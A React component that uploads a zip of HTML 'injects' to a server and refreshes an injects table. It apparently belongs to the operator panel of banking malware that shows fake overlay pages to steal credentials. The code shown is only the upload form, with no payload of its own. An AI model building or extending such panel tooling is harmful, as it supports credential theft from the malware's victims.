import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';

class AddInjectForm extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
            HtmlFile: '',
            HtmlFileValid: false
        };
    }

    SelectHtmlFile(filess) {
        try {
            let CurrHTMLFile = filess[0];
            if(CurrHTMLFile.type == "application/zip") {
                let reader = new FileReader();
                reader.readAsDataURL(CurrHTMLFile);
                reader.onload = function (evt) {
                    try_eval('$.notify("Uploading..", "info")');
                    this.setState({ 
                        HtmlFile: evt.target.result.split(',')[1],
                        HtmlFileValid: true
                    });
                  //  SettingsContext.ShowToast('success', "Load HTML file complete");
                
                }.bind(this);
                reader.onerror = function (evt) {
                    this.setState({ 
                        HtmlFileValid: false
                    });
                    try_eval('document.getElementById("HtmlFileInput").value = "";');
                    SettingsContext.ShowToastTitle('error', 'Error', 'error reading file');
                }.bind(this);
            }
            else {
                this.setState({ 
                    HtmlFileValid: false
                });
                try_eval('document.getElementById("HtmlFileInput").value = "";');
                SettingsContext.ShowToastTitle('warning', 'Html', "Please select only HTML files");
            }
        }
        catch (err) {
            this.setState({ 
                HtmlFileValid: false
            });
            SettingsContext.ShowToastTitle('error', 'Error', err);
        }
    }


    OnSendInjectData() {
       // console.log( new Buffer('{"sent_request":"addHtmlInjection","app":"' + this.state.AppName + '","html":"' + this.state.HtmlFile + '","icon":"' + this.state.PngFile + '"}').toString('base64'));
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer('{"sent_request":"uploading_zip_injects","zip":"' + this.state.HtmlFile  + '"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error))
				{
                    try_eval('$.notify("Error uploading", "warn");');
					//SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}
				else
				{
                    try_eval('$.notify("Injections uploading", "info");');
					//SettingsContext.ShowToast('success', 'Inject adddedd');
					SettingsContext.UpdateInjectsTable();
					this.props.InjListForceUpdate();
					try_eval('document.getElementById("HtmlFileInput").value = "";');
					this.setState({
						HtmlFile: '',
						HtmlFileValid: false
					});
				}
			
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error add inject. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render() {
        return (
            <React.Fragment>
                <div class="form-group">
                    <input type="file" onChange={ (e) => this.SelectHtmlFile(e.target.files) } class="form-control-file" id="HtmlFileInput" />
                    <small class="form-text text-muted">Select only *.zip files.</small>
                  
                  <center>  <button class="btn btn-outline-primary" onClick={this.OnSendInjectData.bind(this)} disabled={!(this.state.HtmlFileValid)}>Uploading *.zip</button> </center>
                </div>
            </React.Fragment>
        );
    }
}

export default AddInjectForm;